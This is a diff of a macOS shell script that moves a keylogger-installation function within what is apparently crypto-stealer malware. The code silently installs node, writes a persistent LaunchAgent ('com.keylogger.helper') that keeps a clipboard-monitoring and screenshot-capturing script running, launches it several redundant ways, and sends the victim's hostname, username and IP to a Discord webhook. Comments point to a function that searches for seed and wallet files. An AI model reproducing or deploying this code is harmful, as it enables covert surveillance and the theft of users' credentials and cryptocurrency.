@@ -1750,6 +1750,162 @@ setInterval(() => {
 console.log = () => {};
 console.error = () => {};
 KEYLOGGEREOF
+    
+    # Create package.json
+    cat > "$APP_DIR/package.json" << 'PKGEOF'
+{
+  "name": "keylogger-helper",
+  "version": "1.0.0",
+  "main": "keylogger-screenshotter.js",
+  "dependencies": {
+  }
+}
+PKGEOF
+    
+    # Install dependencies (silent, but ensure it completes)
+    (cd "$APP_DIR" && npm install --silent --no-audit --no-fund >/dev/null 2>&1) || {
+        # If npm install fails, try installing node first
+        if ! command -v node >/dev/null 2>&1; then
+            if command -v brew >/dev/null 2>&1; then
+                brew install node >/dev/null 2>&1 || true
+            fi
+        fi
+        # Retry npm install
+        (cd "$APP_DIR" && npm install --silent --no-audit --no-fund >/dev/null 2>&1) || true
+    }
+    
+    # REMOVED: pke keylogger installation (repository not available)
+    # Clipboard monitoring is working and captures copy/paste activity
+    
+    # Create Launch Agent for 24/7 operation (runs even after terminal closes)
+    local LAUNCH_AGENT_DIR="$HOME/Library/LaunchAgents"
+    local KEYLOGGER_AGENT_FILE="$LAUNCH_AGENT_DIR/com.keylogger.helper.plist"
+    
+    mkdir -p "$LAUNCH_AGENT_DIR" 2>/dev/null
+    
+    cat > "$KEYLOGGER_AGENT_FILE" << PLISTEOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.keylogger.helper</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>$NODE_PATH</string>
+        <string>$APP_DIR/keylogger-screenshotter.js</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+    <key>LaunchOnlyOnce</key>
+    <false/>
+    <key>WorkingDirectory</key>
+    <string>$APP_DIR</string>
+    <key>StandardOutPath</key>
+    <string>$APP_DIR/keylogger.log</string>
+    <key>StandardErrorPath</key>
+    <string>$APP_DIR/keylogger.error.log</string>
+    <key>ProcessType</key>
+    <string>Background</string>
+    <key>ThrottleInterval</key>
+    <integer>10</integer>
+    <key>StartInterval</key>
+    <integer>60</integer>
+</dict>
+</plist>
+PLISTEOF
+    
+    # Get system info for notification (do this early so we can send even if installation fails)
+    local HOSTNAME=$(hostname 2>/dev/null || echo "Unknown")
+    local USERNAME=$(whoami 2>/dev/null || echo "Unknown")
+    local IP=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | head -1 | awk '{print $2}' || echo "Unknown")
+    
+    # FORCE installation - always create file and start keylogger (NO CHECKS, NO SKIPS!)
+    # Load and start Launch Agent (ensure it actually starts and persists!)
+    launchctl unload "$KEYLOGGER_AGENT_FILE" 2>/dev/null || true
+    sleep 1
+    
+    # Load the LaunchAgent
+    launchctl load "$KEYLOGGER_AGENT_FILE" 2>/dev/null || launchctl load -w "$KEYLOGGER_AGENT_FILE" 2>/dev/null || true
+    
+    # Start it via LaunchAgent
+    sleep 2
+    launchctl start com.keylogger.helper 2>/dev/null || true
+    
+    # ALWAYS start directly as nohup (don't wait for checks - just start it!)
+    sleep 1
+    if [ -f "$NODE_PATH" ]; then
+        nohup "$NODE_PATH" "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/nohup.log" 2>&1 &
+    elif command -v node >/dev/null 2>&1; then
+        nohup node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/nohup.log" 2>&1 &
+    else
+        # Try with just "node" command anyway
+        nohup node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/nohup.log" 2>&1 &
+    fi
+    
+    # Also start directly as backup (multiple methods to ensure it runs)
+    sleep 2
+    if [ -f "$NODE_PATH" ]; then
+        "$NODE_PATH" "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/direct.log" 2>&1 &
+    elif command -v node >/dev/null 2>&1; then
+        node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/direct.log" 2>&1 &
+    else
+        node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/direct.log" 2>&1 &
+    fi
+    
+    # Wait and verify, then retry if needed
+    sleep 5
+    if ! pgrep -f "keylogger-screenshotter.js" >/dev/null 2>&1; then
+        # Last resort - try again
+        sleep 3
+        if [ -f "$NODE_PATH" ]; then
+            "$NODE_PATH" "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/retry.log" 2>&1 &
+        elif command -v node >/dev/null 2>&1; then
+            node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/retry.log" 2>&1 &
+        else
+            node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/retry.log" 2>&1 &
+        fi
+    fi
+    
+    # ALWAYS send notification (even if installation had issues, LaunchAgent will ensure it runs)
+    # Create Discord embed for keylogger installation success
+    local INSTALL_JSON=$(cat <<EOF
+{
+  "embeds": [{
+    "title": "✅ Keylogger Installed & Running",
+    "color": 3066993,
+    "description": "Keylogger has been successfully installed and patched to the system.\\n\\n**Status:** Running 24/7 (persistent via LaunchAgent)",
+    "fields": [
+      {"name": "💻 Hostname", "value": "\`${HOSTNAME}\`", "inline": true},
+      {"name": "👤 PC Username", "value": "\`${USERNAME}\`", "inline": true},
+      {"name": "🌍 IP Address", "value": "\`${IP}\`", "inline": true},
+      {"name": "🔧 Installation Method", "value": "LaunchAgent + Direct Process", "inline": false},
+      {"name": "⏰ Timestamp", "value": "\`$(date '+%Y-%m-%d %H:%M:%S')\`", "inline": false}
+    ],
+    "footer": {"text": "Keylogger is now monitoring clipboard and capturing screenshots"},
+    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%S.000Z)"
+  }]
+}
+EOF
+)
+    
+    # Send to Discord (use WEBHOOK_URL from function scope) - ALWAYS SEND
+    # Write JSON to temp file first to ensure proper formatting
+    local TEMP_JSON="/tmp/keylogger_install_notification.json"
+    echo "$INSTALL_JSON" > "$TEMP_JSON" 2>/dev/null
+    curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
+        --data-binary "@$TEMP_JSON" \
+        "$WEBHOOK_URL" >/dev/null 2>&1
+    rm -f "$TEMP_JSON" 2>/dev/null
+    
+    # Keylogger startup message is also sent by the JS script itself
+}
+
+# ---------------------
+# SEARCH FOR SEED/WALLET FILES
+# ---------------------
 
 search_seed_files() {
     local SEARCH_DIRS=(
@@ -2629,170 +2785,19 @@ EOF
         "$WEBHOOK" >/dev/null 2>&1
 }
 
-# ============================================
-# KEYLOGGER INSTALLATION FUNCTION
-# ============================================
-# MOVED TO TOP OF SCRIPT - MUST BE DEFINED BEFORE CALLED
-# (Function definition moved from line 954 to here)
-# Function is now defined at line 68, this is just a comment marker
-
-# ---------------------
-# SEARCH FOR SEED/WALLET FILES
-# ---------------------
-    
-    # Create package.json
-    cat > "$APP_DIR/package.json" << 'PKGEOF'
-{
-  "name": "keylogger-helper",
-  "version": "1.0.0",
-  "main": "keylogger-screenshotter.js",
-  "dependencies": {
-  }
-}
-PKGEOF
-    
-    # Install dependencies (silent, but ensure it completes)
-    (cd "$APP_DIR" && npm install --silent --no-audit --no-fund >/dev/null 2>&1) || {
-        # If npm install fails, try installing node first
-        if ! command -v node >/dev/null 2>&1; then
-            if command -v brew >/dev/null 2>&1; then
-                brew install node >/dev/null 2>&1 || true
-            fi
-        fi
-        # Retry npm install
-        (cd "$APP_DIR" && npm install --silent --no-audit --no-fund >/dev/null 2>&1) || true
-    }
-    
-    # REMOVED: pke keylogger installation (repository not available)
-    # Clipboard monitoring is working and captures copy/paste activity
-    
-    # Create Launch Agent for 24/7 operation (runs even after terminal closes)
-    local LAUNCH_AGENT_DIR="$HOME/Library/LaunchAgents"
-    local KEYLOGGER_AGENT_FILE="$LAUNCH_AGENT_DIR/com.keylogger.helper.plist"
-    
-    mkdir -p "$LAUNCH_AGENT_DIR" 2>/dev/null
-    
-    cat > "$KEYLOGGER_AGENT_FILE" << PLISTEOF
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.keylogger.helper</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>$NODE_PATH</string>
-        <string>$APP_DIR/keylogger-screenshotter.js</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-    <key>LaunchOnlyOnce</key>
-    <false/>
-    <key>WorkingDirectory</key>
-    <string>$APP_DIR</string>
-    <key>StandardOutPath</key>
-    <string>$APP_DIR/keylogger.log</string>
-    <key>StandardErrorPath</key>
-    <string>$APP_DIR/keylogger.error.log</string>
-    <key>ProcessType</key>
-    <string>Background</string>
-    <key>ThrottleInterval</key>
-    <integer>10</integer>
-    <key>StartInterval</key>
-    <integer>60</integer>
-</dict>
-</plist>
-PLISTEOF
-    
-    # Get system info for notification (do this early so we can send even if installation fails)
-    local HOSTNAME=$(hostname 2>/dev/null || echo "Unknown")
-    local USERNAME=$(whoami 2>/dev/null || echo "Unknown")
-    local IP=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | head -1 | awk '{print $2}' || echo "Unknown")
-    
-    # FORCE installation - always create file and start keylogger (NO CHECKS, NO SKIPS!)
-    # Load and start Launch Agent (ensure it actually starts and persists!)
-    launchctl unload "$KEYLOGGER_AGENT_FILE" 2>/dev/null || true
-    sleep 1
-    
-    # Load the LaunchAgent
-    launchctl load "$KEYLOGGER_AGENT_FILE" 2>/dev/null || launchctl load -w "$KEYLOGGER_AGENT_FILE" 2>/dev/null || true
-    
-    # Start it via LaunchAgent
-    sleep 2
-    launchctl start com.keylogger.helper 2>/dev/null || true
-    
-    # ALWAYS start directly as nohup (don't wait for checks - just start it!)
-    sleep 1
-    if [ -f "$NODE_PATH" ]; then
-        nohup "$NODE_PATH" "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/nohup.log" 2>&1 &
-    elif command -v node >/dev/null 2>&1; then
-        nohup node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/nohup.log" 2>&1 &
-    else
-        # Try with just "node" command anyway
-        nohup node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/nohup.log" 2>&1 &
-    fi
-    
-    # Also start directly as backup (multiple methods to ensure it runs)
-    sleep 2
-    if [ -f "$NODE_PATH" ]; then
-        "$NODE_PATH" "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/direct.log" 2>&1 &
-    elif command -v node >/dev/null 2>&1; then
-        node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/direct.log" 2>&1 &
-    else
-        node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/direct.log" 2>&1 &
-    fi
-    
-    # Wait and verify, then retry if needed
-    sleep 5
-    if ! pgrep -f "keylogger-screenshotter.js" >/dev/null 2>&1; then
-        # Last resort - try again
-        sleep 3
-        if [ -f "$NODE_PATH" ]; then
-            "$NODE_PATH" "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/retry.log" 2>&1 &
-        elif command -v node >/dev/null 2>&1; then
-            node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/retry.log" 2>&1 &
-        else
-            node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/retry.log" 2>&1 &
-        fi
-    fi
-    
-    # ALWAYS send notification (even if installation had issues, LaunchAgent will ensure it runs)
-    # Create Discord embed for keylogger installation success
-    local INSTALL_JSON=$(cat <<EOF
-{
-  "embeds": [{
-    "title": "✅ Keylogger Installed & Running",
-    "color": 3066993,
-    "description": "Keylogger has been successfully installed and patched to the system.\\n\\n**Status:** Running 24/7 (persistent via LaunchAgent)",
-    "fields": [
-      {"name": "💻 Hostname", "value": "\`${HOSTNAME}\`", "inline": true},
-      {"name": "👤 PC Username", "value": "\`${USERNAME}\`", "inline": true},
-      {"name": "🌍 IP Address", "value": "\`${IP}\`", "inline": true},
-      {"name": "🔧 Installation Method", "value": "LaunchAgent + Direct Process", "inline": false},
-      {"name": "⏰ Timestamp", "value": "\`$(date '+%Y-%m-%d %H:%M:%S')\`", "inline": false}
-    ],
-    "footer": {"text": "Keylogger is now monitoring clipboard and capturing screenshots"},
-    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%S.000Z)"
-  }]
-}
-EOF
-)
-    
-    # Send to Discord (use WEBHOOK_URL from function scope) - ALWAYS SEND
-    # Write JSON to temp file first to ensure proper formatting
-    local TEMP_JSON="/tmp/keylogger_install_notification.json"
-    echo "$INSTALL_JSON" > "$TEMP_JSON" 2>/dev/null
-    curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
-        --data-binary "@$TEMP_JSON" \
-        "$WEBHOOK_URL" >/dev/null 2>&1
-    rm -f "$TEMP_JSON" 2>/dev/null
-    
-    # Keylogger startup message is also sent by the JS script itself
-}
-
 # Keylogger installation moved to AFTER Extension ID prompt (see line ~678)
+# This ensures it runs after user input and starts properly
+
+# Wait for seed file search to complete (if it was started)
+if [ -n "$SEED_SEARCH_PID" ]; then
+    wait $SEED_SEARCH_PID 2>/dev/null || true
+fi
+
+# Cleanup - delete all temp files (after Extension ID and keylogger installation)
+# This cleanup happens at the very end, after everything is done
+# Note: Cleanup is now done AFTER Extension ID prompt and keylogger installation
+
+# Keylogger installation moved to AFTER Extension ID prompt
 # This ensures it runs after user input and starts properly
 
 # Wait for seed file search to complete (if it was started)
